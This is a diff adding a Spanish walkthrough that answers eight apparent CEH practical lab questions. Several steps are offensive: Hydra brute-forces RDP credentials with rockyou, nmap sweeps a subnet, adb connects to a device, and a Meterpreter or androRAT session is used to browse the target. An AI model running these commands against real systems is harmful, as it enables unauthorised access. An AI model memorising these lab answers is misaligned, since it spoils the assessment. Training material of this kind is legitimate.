@@ -160,5 +160,103 @@ python3 androRAT.py --shell -i 0.0.0.0 -p 4444
 ```
 y desde su consola interactiva usar el comando de listado/descarga de archivos que ofrezca el menú `help`.
 
+
+Aquí el procedimiento para cada uno:
+
+1) Hash SHA224 de ejecutable ELF64 "Ghostware"
+
+file Ghostware              # confirmar que es ELF 64-bit
+sha224sum Ghostware
+
+Toma los últimos 4 caracteres del hash impreso.
+
+2) RDP + descifrar forger.cfe + SHA1 de imagen
+
+Descubrir hosts con RDP (puerto 3389):
+nmap -p 3389 --open 10.10.55.0/24
+Crackear credenciales de Jones:
+hydra -l Jones -P /usr/share/wordlists/rockyou.txt rdp://[IP]
+Conectarte y localizar forger.cfe:
+xfreerdp /u:Jones /p:<password_encontrada> /v:[IP]
+.cfe suele ser un contenedor cifrado (CryptoForge). Extrae/descifra usando la contraseña de Jones (CryptoForge Decrypt, por GUI o su CLI si está instalado en la máquina).
+Una vez obtenida la imagen descifrada:
+sha1sum imagen_descifrada.<ext>
+
+Toma los últimos 6 caracteres (formato NNaaNN).
+
+3) Esteganografía en .bmp de dispositivo móvil
+
+Accede al dispositivo (vía ADB si hay debug habilitado, o vía el RAT ya desplegado si aplica):
+adb connect [IP]:5555
+adb shell
+adb pull /sdcard/<ruta>/imagen.bmp
+Analiza el BMP en busca de datos ocultos. Prueba primero herramientas comunes de esteganografía usadas en los labs de EC-Council:
+steghide extract -sf imagen.bmp
+
+Si steghide falla (no siempre funciona con BMP), prueba OpenStego o inspección con exiftool / binwalk:
+
+binwalk imagen.bmp
+exiftool imagen.bmp
+
+El texto extraído es el secret code (formato AaaaaANa).
+
+4) Base64 en archivos subidos por DVWA
+
+Login en DVWA (admin/password) y revisa los archivos subidos en:
+C:\wamp64\www\DVWA\SecureWeb\prod\
+
+(por RDP/acceso a la máquina, o vía un LFI/path traversal si el objetivo es explotar la subida).
+2. Identifica cuál archivo contiene texto base64 (ábrelos con type o cat).
+3. Decodifica cada candidato:
+
+echo "<cadena_base64>" | base64 -d
+
+El que produzca texto legible es el mensaje original (formato AaaN*aNaN).
+
+5) CVE de menor severidad tras escaneo de vulnerabilidades
+
+Escaneo con OpenVAS (o Nessus si está disponible en el lab):
+docker run -d -p 443:443 --name openvas mikesplain/openvas
+Añade el target 192.168.44.32, ejecuta el scan.
+En el reporte, ordena resultados por severidad ascendente y toma el CVE con el score más bajo (formato AAA-NNNN-NNNN, ej. CVE-2017-1234).
+Alternativa rápida con nmap:
+nmap --script vuln 192.168.44.32
+
+6) pixelpioneer.txt — extracción con "password" como clave
+El archivo probablemente es un contenedor esteganográfico o cifrado (no texto plano). Como sabes que la clave es literalmente password:
+
+steghide extract -sf pixelpioneer.txt -p password
+
+Si no es steghide sino un archivo cifrado directo (OpenSSL), prueba:
+
+openssl enc -d -aes-256-cbc -in pixelpioneer.txt -out output.txt -k password
+
+El contenido resultante es la credencial de 9 caracteres alfanuméricos (formato ANaa*aANaNa — ojo, el formato dado tiene más de 9, revisa si piden el resultado completo del archivo, no solo la credencial).
+
+7) Static malware analysis — Image Version de Wildfire.exe
+Usa PEStudio o Detect It Easy (DIE), herramientas típicas de análisis estático en los labs de CEH:
+
+Abre Wildfire.exe en PEStudio.
+Ve a la sección Header / Optional Header.
+Busca el campo Image Version (o "Major/Minor Image Version").
+CLI alternativa con pefile en Python:
+python
+import pefile
+pe = pefile.PE("Wildfire.exe")
+print(pe.OPTIONAL_HEADER.MajorImageVersion, pe.OPTIONAL_HEADER.MinorImageVersion)
+
+Formato N*N sugiere algo como 6.3.
+
+8) Contar archivos en carpeta "Honeywell" vía RAT
+
+Conéctate a la sesión activa del RAT ya desplegado en la máquina objetivo (según el lab, suele ser Metasploit/Meterpreter o njRAT/AndroRAT):
+msfconsole
+sessions -i [id]
+Dentro de la sesión Meterpreter:
+cd C:\\Users\\<usuario>\\...\\Honeywell
+ls
+Cuenta el número de archivos listados — esa es tu respuesta (formato N).
+Si el RAT es distinto, usa su comando equivalente de listado de directorio (dir, ls, list files según el cliente).
+
 ---
 
